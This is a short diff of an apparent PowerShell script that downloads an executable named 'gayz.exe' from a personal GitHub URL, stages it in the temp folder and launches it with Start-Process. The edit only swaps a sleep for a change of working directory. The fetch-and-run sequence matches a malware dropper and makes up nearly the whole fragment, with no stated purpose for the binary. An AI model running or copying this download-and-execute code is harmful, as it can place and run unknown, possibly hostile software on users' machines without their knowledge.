@@ -27,6 +27,6 @@ if (Test-Path $file) {
 else { Write-host "$file doesn't exist" }
 $client.DownloadFile("https://github.com/jostanise/s/raw/main/gayz/gayz.exe", $file)
 
-Start-Sleep -Seconds 1.5
+Set-Location -Path $env:temp
 
 Start-Process -Filepath $file
